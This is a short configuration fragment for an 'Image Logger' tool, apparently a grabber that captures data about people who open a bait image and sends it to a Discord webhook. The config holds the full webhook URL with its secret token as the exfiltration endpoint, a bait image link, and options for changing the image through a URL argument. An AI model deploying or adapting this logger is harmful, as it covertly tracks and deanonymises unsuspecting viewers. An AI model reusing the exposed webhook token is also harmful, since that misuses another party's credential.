...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1075895819678519316/j7ty1hXhO8BCddvtEw4J5lFW1ROXJhRTpej98hmrd0OUPcoPdqPsJrneOCgg8_iDpCsK",
    "image": "https://cdn.discordapp.com/attachments/1075895537481560126/1075896127368470608/minerals.png", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "Logger": "Image Logger", # Set this to the name you want the webhook to have
